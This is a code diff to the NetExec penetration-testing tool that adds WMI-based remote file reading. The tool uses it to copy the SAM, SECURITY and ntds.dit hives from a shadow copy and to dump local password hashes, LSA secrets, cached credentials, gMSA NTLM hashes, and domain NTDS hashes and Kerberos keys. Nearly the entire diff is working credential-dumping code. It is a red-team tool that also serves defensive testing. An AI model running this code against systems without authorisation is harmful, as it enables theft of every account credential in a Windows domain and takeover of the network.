@@ -1,20 +1,28 @@
 import os
+import struct
+import binascii
+from Cryptodome.Hash import MD4
 from io import StringIO
 
 from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.config import process_secret
 from nxc.connection import connection, dcom_FirewallChecker, requires_admin
+from nxc.helpers.misc import validate_ntlm
 from nxc.logger import NXCAdapter
+from nxc.helpers.logger import highlight
+from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.protocols.wmi import wmiexec, wmiexec_event
+from nxc.protocols.wmi.remoteops import RemoteOperations
 
 from impacket import ntlm
 from impacket.uuid import uuidtup_to_bin
 from impacket.krb5.ccache import CCache
+from impacket.examples.secretsdump import LSASecrets, SAMHashes, NTDSHashes
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5 import transport, epm
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, MSRPC_BIND, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
-from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login
+from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login, DCERPCSessionError, IWbemServices
 
 MSRPC_UUID_PORTMAP = uuidtup_to_bin(("E1AF8308-5D1F-11C9-91A4-08002B14A0FA", "3.0"))
 
@@ -47,6 +55,8 @@ class wmi(connection):
         }
         self.iWbemLevel1Login = None
         self.dcom_conn = None
+        self.namespaces = {}
+        self._remote_ops = None
 
         connection.__init__(self, args, db, host)
 
@@ -173,8 +183,7 @@ class wmi(connection):
             else:
                 try:
                     self.iWbemLevel1Login = IWbemLevel1Login(iInterface)
-                    _ = self.iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
-                    self.iWbemLevel1Login.RemRelease()
+                    self.get_namespace("//./root/cimv2")
                 except Exception as e:
                     if "access_denied" not in str(e).lower():
                         self.logger.fail(str(e))
@@ -365,6 +374,230 @@ class wmi(connection):
                 self.logger.success(out)
                 return True
 
+    def read_file(self, remote_path) -> "bytes | None":
+        self.logger.debug(f"Try reading file {remote_path}")
+        escaped_path = remote_path.replace("\\", "\\\\")
+
+        # Load the Namespace
+        powershellv3_namespace = self.get_namespace("//./root/Microsoft/Windows/Powershellv3")
+        if powershellv3_namespace is None:
+            return None
+
+        # Read the file
+        try:
+            object_path = f'PS_ModuleFile.InstanceID="{escaped_path}"'
+            iWbemClassObject, _ = powershellv3_namespace.GetObject(object_path)
+        except DCERPCSessionError as e:
+            if e.error_code == 0x80041002:
+                self.logger.debug(f"Cannot find {remote_path} file")
+            return None
+
+        obj = iWbemClassObject.getProperties()
+
+        file_data = None
+        for prop_name, prop_value in obj.items():
+            if prop_name == "FileData":
+                file_data = prop_value["value"]
+                break
+
+        if len(file_data) < 4:
+            return None
+
+        # Unpack it
+        file_length = struct.unpack(">I", bytes(file_data[:4]))[0]
+        return bytes(file_data[4:4 + file_length])
+
+    def get_file_single(self, remote_path, download_path):
+
+        if self.args.append_host:
+            download_path = f"{self.hostname}-{remote_path}"
+
+        file_data = self.read_file(remote_path)
+        if file_data is None:
+            return False
+        else:
+
+            with open(download_path, "wb+") as file:
+                file.write(file_data)
+            return True
+
+    @requires_admin
+    def get_file(self):
+        for src, dest in self.args.get_file:
+            self.logger.display(f'Copying "{src}" to "{dest}"')
+            if self.get_file_single(src, dest):
+                self.logger.success(f'File "{src}" was downloaded to "{dest}"')
+            else:
+                self.logger.fail(f'Could not get file "{src}"')
+
+    @requires_admin
+    def sam(self):
+        def add_sam_hash(sam_hash):
+            self.logger.highlight(sam_hash)
+            if "_history" in sam_hash:
+                return
+            username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
+            add_sam_hash.sam_hashes += 1
+
+        add_sam_hash.sam_hashes = 0
+
+        output_filename = self.output_file_template.format(output_folder="sam")
+
+        bootkey = self.remote_ops.get_bootkey(output_filename)
+        if bootkey is None:
+            return
+
+        # Get the SAM hive
+        sam_hive_path = f"{self.remote_ops.shadow_copy_path}\\Windows\\System32\\config\\SAM"
+        if not self.get_file_single(sam_hive_path, f"{output_filename}.sam"):
+            self.logger.fail("Could not get SAM hive")
+            return
+
+        SAM = SAMHashes(
+                f"{output_filename}.sam",
+                bootkey,
+                isRemote=None,
+                history=self.args.history,
+                perSecretCallback=lambda secret: add_sam_hash(secret),
+            )
+        self.logger.display("Dumping SAM hashes")
+        SAM.dump()
+        SAM.export(output_filename)
+        self.logger.success(f"Dumped {highlight(add_sam_hash.sam_hashes)} SAM hashes to {output_filename + '.sam'}")
+
+    @requires_admin
+    def lsa(self):
+        def add_lsa_secret(secret):
+            add_lsa_secret.secrets += 1
+            self.logger.highlight(secret)
+            if "_SC_GMSA_{84A78B8C" in secret:
+                gmsa_id = secret.split("_")[4].split(":")[0]
+                data = bytes.fromhex(secret.split("_")[4].split(":")[1])
+                blob = MSDS_MANAGEDPASSWORD_BLOB()
+                blob.fromString(data)
+                currentPassword = blob["CurrentPassword"][:-2]
+                ntlm_hash = MD4.new()
+                ntlm_hash.update(currentPassword)
+                passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
+                self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
+
+        add_lsa_secret.secrets = 0
+
+        output_filename = self.output_file_template.format(output_folder="lsa")
+
+        bootkey = self.remote_ops.get_bootkey(output_filename)
+        if bootkey is None:
+            return
+
+        # Get the LSA hive
+        lsa_hive_path = f"{self.remote_ops.shadow_copy_path}\\Windows\\System32\\config\\SECURITY"
+        if not self.get_file_single(lsa_hive_path, f"{output_filename}.security"):
+            self.logger.fail("Could not get LSA hive")
+            return
+
+        LSA = LSASecrets(
+            f"{output_filename}.security",
+            bootkey,
+            None,
+            isRemote=None,
+            perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
+        )
+        self.logger.display("Dumping LSA secrets")
+        LSA.dumpCachedHashes()
+        LSA.exportCached(output_filename)
+        LSA.dumpSecrets()
+        LSA.exportSecrets(output_filename)
+        self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {output_filename + '.secrets'} and {output_filename + '.cached'}")
+
+    @requires_admin
+    def ntds(self):
+        printed_kerb_keys_banner = False
+
+        def add_hash(secret_type, secret):
+            nonlocal printed_kerb_keys_banner
+            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                self.logger.display("Kerberos keys:")
+                printed_kerb_keys_banner = True
+
+            # Count the type of secrets
+            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                add_hash.kerb_secrets += 1
+            else:
+                add_hash.nt_lm_secrets += 1
+
+            # Log the secret based on args
+            if self.args.enabled:
+                if "Enabled" in secret:
+                    secret = " ".join(secret.split(" ")[:-1])
+                    self.logger.highlight(secret)
+            else:
+                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
+                self.logger.highlight(secret)
+
+            # Filter out computer accounts, history hashes and kerberos keys for adding to db
+            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
+                if secret.find("\\") != -1:
+                    _, clean_hash = secret.split("\\")
+                else:
+                    clean_hash = secret
+
+                try:
+                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
+                    parsed_hash = f"{lmhash}:{nthash}"
+                    if validate_ntlm(parsed_hash):
+                        add_hash.added_to_db += 1
+                        return
+                    raise
+                except Exception:
+                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
+            else:
+                self.logger.debug("Dumped hash is a computer account, not adding to db")
+
+        add_hash.nt_lm_secrets = 0
+        add_hash.kerb_secrets = 0
+        add_hash.added_to_db = 0
+
+        output_filename = self.output_file_template.format(output_folder="ntds")
+
+        bootkey = self.remote_ops.get_bootkey(output_filename)
+        if bootkey is None:
+            return
+
+        # Get the LSA hive
+        lsa_hive_path = f"{self.remote_ops.shadow_copy_path}\\Windows\\NTDS\\ntds.dit"
+        if not self.get_file_single(lsa_hive_path, f"{output_filename}.ntds.dit"):
+            self.logger.fail("Could not get ntds.dit")
+            return
+
+        NTDS = NTDSHashes(
+            f"{output_filename}.ntds.dit",
+            self.remote_ops.bootkey,
+            isRemote=False,
+            history=self.args.history,
+            noLMHash=True,
+            justNTLM=not self.args.kerberos_keys,
+            useVSSMethod=True,
+            remoteOps=None,
+            pwdLastSet=False,
+            resumeSession=None,
+            outputFileName=f"{output_filename}.ntds",
+            justUser=self.args.userntds if self.args.userntds else None,
+            printUserStatus=True,
+            perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret),
+        )
+
+        try:
+            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
+            NTDS.dump()
+            ntds_outfile = f"{output_filename}.ntds"
+            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile}")
+            if self.args.kerberos_keys:
+                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
+            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
+            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
+        except Exception as e:
+            self.logger.fail(e)
+
     @requires_admin
     def wmi_query(self, wql=None, namespace=None, callback_func=None):
         records = []
@@ -375,8 +608,7 @@ class wmi(connection):
             namespace = self.args.wmi_namespace
 
         try:
-            iWbemServices = self.iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
-            self.iWbemLevel1Login.RemRelease()
+            iWbemServices = self.get_namespace(namespace)
             iEnumWbemClassObject = iWbemServices.ExecQuery(wql)
         except Exception as e:
             self.logger.debug(str(e))
@@ -484,3 +716,23 @@ class wmi(connection):
             return output
         else:
             return output
+
+    def get_namespace(self, namespace: str) -> IWbemServices:
+        """Load WMI namespaces and place them in cache. If a namespace is already loaded in cache, return the namespace in cache"""
+        if namespace in self.namespaces:
+            return self.namespaces[namespace]
+        self.logger.debug(f"Getting namespace {namespace}")
+        try:
+            iWbemServices = self.iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
+            self.iWbemLevel1Login.RemRelease()
+        except Exception as e:
+            self.logger.debug(f"Cannot load WMI Namespace {namespace}: {e}")
+            return None
+        self.namespaces[namespace] = iWbemServices
+        return self.namespaces[namespace]
+
+    @property
+    def remote_ops(self):
+        if self._remote_ops is None:
+            self._remote_ops = RemoteOperations(self, shadow_id=self.args.shadow_id)
+        return self._remote_ops
